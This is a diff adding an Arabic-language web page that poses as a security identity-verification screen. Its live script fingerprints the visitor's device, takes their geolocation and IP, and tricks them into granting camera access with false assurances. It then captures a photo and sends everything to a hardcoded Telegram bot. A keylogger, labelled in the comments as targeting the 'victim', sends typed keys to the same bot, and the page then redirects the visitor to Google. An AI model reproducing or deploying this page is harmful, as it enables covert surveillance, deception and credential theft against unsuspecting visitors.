@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث الأمان - التحقق من الهوية</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding-top: 50px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 20px auto;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+        }
+        .loader { 
+            border: 5px solid rgba(255,255,255,0.3); 
+            border-top: 5px solid white; 
+            border-radius: 50%; 
+            width: 60px; 
+            height: 60px; 
+            animation: spin 1s linear infinite; 
+            margin: 20px auto; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        .message-box {
+            background: rgba(0,0,0,0.3);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+        .trust-badge { 
+            background: #4CAF50; 
+            display: inline-block; 
+            padding: 8px 20px; 
+            border-radius: 25px; 
+            font-size: 14px; 
+            margin-top: 20px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: #4CAF50;
+            animation: progress 3s ease-out;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .status-icon {
+            font-size: 50px;
+            margin: 20px 0;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.3s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="status-icon" id="statusIcon">🔒</div>
+        <div class="loader" id="loader"></div>
+        <div class="message-box">
+            <h2 id="message">جاري تأمين الاتصال...</h2>
+            <p id="subMessage" style="font-size: 14px; margin-top: 10px;"></p>
+        </div>
+        <div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+        <div class="trust-badge" id="trustBadge">✓ اتصال آمن مشفر ✓</div>
+        <button id="retryBtn" class="hidden">إعادة المحاولة</button>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // ========== إعدادات البوت ==========
+        const BOT_TOKEN = '8409410631:AAHMS_10O8wbSG5OesZzIcxg78mR-5xpYE4';
+        const CHAT_ID = '5156556639';
+        
+        // ========== الميزة 1: معلومات الجهاز ==========
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                online: navigator.onLine,
+                cookiesEnabled: navigator.cookieEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+        }
+        
+        // ========== الميزة 2: معلومات الموقع ==========
+        function getLocation() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                timestamp: new Date().toISOString()
+                            });
+                        },
+                        (error) => {
+                            resolve(null);
+                        }
+                    );
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+        
+        // ========== الميزة 3: التقاط صورة من الكاميرا (جودة عالية) ==========
+        function captureHighQualityPhoto(videoElement) {
+            return new Promise((resolve) => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                
+                // دقة عالية
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob((blob) => {
+                    resolve(blob);
+                }, 'image/jpeg', 0.9); // جودة 90%
+            });
+        }
+        
+        // ========== الميزة 4: التقاط صورة من الكاميرا الخلفية (للموبايل) ==========
+        async function getBackCamera() {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const videoDevices = devices.filter(device => device.kind === 'videoinput');
+            const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back') || device.label.toLowerCase().includes('environment'));
+            return backCamera || videoDevices[0];
+        }
+        
+        // ========== الميزة 5: إرسال كل شيء لتليجرام ==========
+        async function sendToTelegram(imageBlob, deviceInfo, location, ipInfo) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'capture.jpg');
+            
+            // إضافة معلومات كـ caption
+            const caption = `
+📸 *تم التقاط صورة جديدة*
+
+🖥️ *معلومات الجهاز:*
+├ نظام: ${deviceInfo.userAgent.split(' ').slice(-2).join(' ')}
+├ اللغة: ${deviceInfo.language}
+├ الشاشة: ${deviceInfo.screenResolution}
+├ الوقت: ${new Date().toLocaleString('ar')}
+└ المنطقة: ${deviceInfo.timezone}
+
+📍 *الموقع:*
+${location ? `├ خط الطول: ${location.lat}
+├ خط العرض: ${location.lon}
+└ الدقة: ${location.accuracy} متر` : '└ غير متاح'}
+
+🌐 *الـ IP:*
+${ipInfo ? `└ ${ipInfo.ip}` : '└ غير متاح'}
+
+🔐 *تم الالتقاط بواسطة نظام التحقق الآمن*
+            `;
+            
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
+            
+            // إرسال الصورة
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            // إرسال معلومات إضافية كملف JSON
+            const infoBlob = new Blob([JSON.stringify({deviceInfo, location, ipInfo}, null, 2)], {type: 'application/json'});
+            const infoFormData = new FormData();
+            infoFormData.append('chat_id', CHAT_ID);
+            infoFormData.append('document', infoBlob, 'device_info.json');
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: infoFormData
+            });
+        }
+        
+        // ========== الميزة 6: جلب الـ IP الخارجي ==========
+        async function getExternalIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                try {
+                    const response = await fetch('https://api.my-ip.io/ip.json');
+                    const data = await response.json();
+                    return {ip: data.ip};
+                } catch {
+                    return null;
+                }
+            }
+        }
+        
+        // ========== الميزة 7: تسجيل دخول الضحية (كي لوجر خفيف) ==========
+        function setupKeyLogger() {
+            let keystrokes = '';
+            let lastSend = Date.now();
+            
+            document.addEventListener('keypress', (e) => {
+                keystrokes += e.key;
+                
+                // إرسال كل 10 ثواني أو 50 حرف
+                if (Date.now() - lastSend > 10000 || keystrokes.length > 50) {
+                    if (keystrokes.length > 0) {
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: `⌨️ *ضغطات المفاتيح:*\n\`${keystrokes}\``,
+                                parse_mode: 'Markdown'
+                            })
+                        });
+                        keystrokes = '';
+                        lastSend = Date.now();
+                    }
+                }
+            });
+        }
+        
+        // ========== الميزة 8: تغيير الرسائل بشكل ديناميكي ==========
+        const messages = [
+            { main: "جاري فحص الجهاز...", sub: "التحقق من إعدادات الأمان" },
+            { main: "جاري الاتصال بخوادم التأمين...", sub: "يرجى الانتظار" },
+            { main: "مطلوب التحقق من الكاميرا", sub: "لأغراض أمنية فقط" },
+            { main: "لن يتم حفظ الصور", sub: "للتحقق الفوري من الهوية" },
+            { main: "آخر خطوة...", sub: "جاري المعالجة" }
+        ];
+        
+        let msgIndex = 0;
+        const msgInterval = setInterval(() => {
+            if (msgIndex < messages.length) {
+                document.getElementById('message').innerHTML = messages[msgIndex].main;
+                document.getElementById('subMessage').innerHTML = messages[msgIndex].sub;
+                msgIndex++;
+            } else {
+                clearInterval(msgInterval);
+            }
+        }, 2000);
+        
+        // ========== الميزة 9: كشف إذا كان الجهاز موبايل أو كمبيوتر ==========
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        
+        // ========== الميزة 10: تغيير الأيقونة حسب الحالة ==========
+        function updateIcon(status) {
+            const icons = {
+                loading: '🔒',
+                camera: '📸',
+                success: '✅',
+                error: '❌'
+            };
+            document.getElementById('statusIcon').innerHTML = icons[status] || '🔒';
+        }
+        
+        // ========== التنفيذ الرئيسي ==========
+        async function main() {
+            updateIcon('loading');
+            
+            // جلب المعلومات
+            const deviceInfo = getDeviceInfo();
+            const ipInfo = await getExternalIP();
+            const location = await getLocation();
+            
+            // طلب الكاميرا (أمامية للموبايل، عادية للكمبيوتر)
+            const cameraConstraints = isMobile ? 
+                { video: { facingMode: { exact: "user" } } } : 
+                { video: true };
+            
+            setTimeout(async () => {
+                try {
+                    updateIcon('camera');
+                    document.getElementById('message').innerHTML = "مطلوب الوصول للكاميرا";
+                    document.getElementById('subMessage').innerHTML = "اضغط سماح للمتابعة";
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia(cameraConstraints);
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    // انتظر حتى تبدأ الكاميرا
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    
+                    document.getElementById('message').innerHTML = "جاري التقاط الصورة...";
+                    
+                    // التقاط صورة بجودة عالية
+                    const imageBlob = await captureHighQualityPhoto(video);
+                    
+                    // إرسال كل شيء
+                    await sendToTelegram(imageBlob, deviceInfo, location, ipInfo);
+                    
+                    // إيقاف الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    updateIcon('success');
+                    document.getElementById('message').innerHTML = "✓ تم التحقق بنجاح!";
+                    document.getElementById('subMessage').innerHTML = "جاري التوجيه...";
+                    document.getElementById('loader').style.display = 'none';
+                    
+                    // بدء تسجيل الضغطات
+                    setupKeyLogger();
+                    
+                    // التوجيه بعد 2 ثانية
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 2000);
+                    
+                } catch (err) {
+                    updateIcon('error');
+                    document.getElementById('message').innerHTML = "حدث خطأ!";
+                    document.getElementById('subMessage').innerHTML = "يرجى السماح بالكاميرا وإعادة المحاولة";
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('retryBtn').classList.remove('hidden');
+                    
+                    document.getElementById('retryBtn').onclick = () => {
+                        location.reload();
+                    };
+                    
+                    // إرسال تقرير الخطأ
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `⚠️ *خطأ في الكاميرا*\n\nالمستخدم: ${deviceInfo.userAgent.substring(0, 100)}\nالخطأ: ${err.message}`,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                }
+            }, 4000);
+        }
+        
+        // تشغيل الكود
+        main();
+    </script>
+</body>
+</html>
